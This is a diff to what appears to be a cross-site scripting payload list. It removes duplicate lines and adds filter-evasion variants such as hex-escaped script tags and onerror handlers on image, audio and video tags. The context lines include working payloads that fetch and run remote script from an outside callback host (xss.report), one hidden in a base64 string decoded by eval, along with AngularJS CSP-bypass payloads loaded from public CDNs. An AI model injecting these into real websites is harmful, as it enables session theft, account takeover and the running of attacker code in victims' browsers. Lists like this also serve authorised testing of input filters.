@@ -2664,9 +2664,7 @@ zzz%27onmou%3Cseover=1&ale%3Crt(%27xsp%27%3C)%3C%3B1%3B%20//
 嘼嘾img%20src%3Dx%20onerror%3Dprompt%28document.domain%29%3B%3E
 嘾嘾<script>alert(2);</script>
 <<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
-<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
 '"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 '"><script src=https://xss.report/c/department></script>
 "><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2RlcGFydG1lbnQiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
 javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.report/c/department\';document.body.appendChild(a)')
@@ -2676,12 +2674,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.re
 <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//xss.report/c/department");a.send();</script>
 <script>$.getScript("//xss.report/c/department")</script>
 var a=document.createElement("script");a.src="https://xss.report/c/department";document.body.appendChild(a);
-<<https:http://x55.is/onfocus=1?import(tagName):1 AutoFocus ContentEditable>>
-<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
-'"><Svg Src=//server OnLoad=import(this.getAttribute('src')+0)>
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 <svg onload=onerror=eval,new'\u0022-alert\x281\x29//'>
-"%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>
 <script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>
 <body ng-app ng-csp><script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.5/angular.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
@@ -2818,3 +2811,20 @@ www.meteoprog.ua
 <body ng-app ng-csp><script src="https://yastat.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 <body ng-app ng-csp><script src="https://yastatic.net/s3/milab/js/angular.min.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 <body ng-app ng-csp><script src="//yuedust.yuedu.126.net/js/components/angular/angular.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
+<script\x3Etype="text/javascript">javascript:alert(1);</script>
+<script\x0Dtype="text/javascript">javascript:alert(1);</script>
+<script\x09type="text/javascript">javascript:alert(1);</script>
+<script\x0Ctype="text/javascript">javascript:alert(1);</script>
+<script\x2Ftype="text/javascript">javascript:alert(1);</script>
+<script\x0Atype="text/javascript">javascript:alert(1);</script>
+'`"><\x3Cscript>javascript:alert(1)</script>        
+'`"><\x00script>javascript:alert(1)</script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<video src=1 href=1 onerror="javascript:alert(1)"></video>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<image src=1 href=1 onerror="javascript:alert(1)"></image>
+<script src=1 href=1 onerror="javascript:alert(1)"></script>
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
